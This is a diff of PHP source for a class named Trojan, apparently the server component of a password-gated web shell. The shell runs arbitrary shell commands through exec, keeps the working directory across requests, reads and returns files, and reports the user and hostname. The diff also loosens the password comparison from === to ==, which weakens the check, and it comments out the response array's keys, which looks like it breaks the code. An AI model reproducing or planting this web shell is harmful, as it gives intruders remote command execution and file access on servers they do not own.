@@ -3,9 +3,11 @@
 class Trojan{
     private $cwd      = '';
     private $response = array(
+        /*
         'error'          => null,
         'output'         => null,
         'prompt_context' => null,
+        */
     );
 
     /**
@@ -60,16 +62,12 @@ class Trojan{
         /* @note: In order to get current directory persistence to work, I need 
          * to inject some `cd` and `pwd` commands around the command sent from 
          * the wash client. */
-        $command    = "cd {$this->cwd}; $command 2>&1; pwd";
         $output_raw = array();
-        exec($command, $output_raw);
+        exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);
 
         # buffer the results
-        $this->cwd                = array_pop($output_raw);
+        $_SESSION['cwd']          = $this->cwd = array_pop($output_raw);
         $this->response['output'] = join($output_raw, "\n");
-
-        # save the cwd
-        $_SESSION['cwd'] = $this->cwd;
 
         # send the response
         $this->send_response();
@@ -97,7 +95,7 @@ class Trojan{
     private function get_prompt_context(){
         $whoami               =  trim(`whoami`);
         $hostname             =  gethostname();
-        $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
+        $line_terminator      =  ($whoami ==  'root') ? '#' : '$' ;
         return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
     }
 
@@ -139,13 +137,12 @@ class Trojan{
             $this->response['error'] = 'File is not readable or does not exist.';
         } else {
             # double-up on the output here
-            $output = array(
+            $this->response['output'] = array(
                 # echo back the contents of the file
                 'output' => file_get_contents($args['file']),
                 # also pass back the absolute path to the file being read
                 'file'   => realpath($args['file']),
             );
-            $this->response['output'] = $output;
         }
         $this->send_response();
     }
@@ -197,11 +194,11 @@ class Trojan{
 }
 
 /* ---------- Procedural code starts here ---------- */
-session_start();
-$trojan = new Trojan();
 
 # only process the command if a valid password has been specified
-if(sha1($_REQUEST['args']['password'] . '<%= locks[:one][:salt] %>') === '<%= locks[:one][:hash] %>'){ 
+if(sha1($_REQUEST['args']['password'] . '<%= locks[:one][:salt] %>') == '<%= locks[:one][:hash] %>'){ 
+    session_start();
+    $trojan = new Trojan();
     $trojan->process_command($_REQUEST);
 }
 
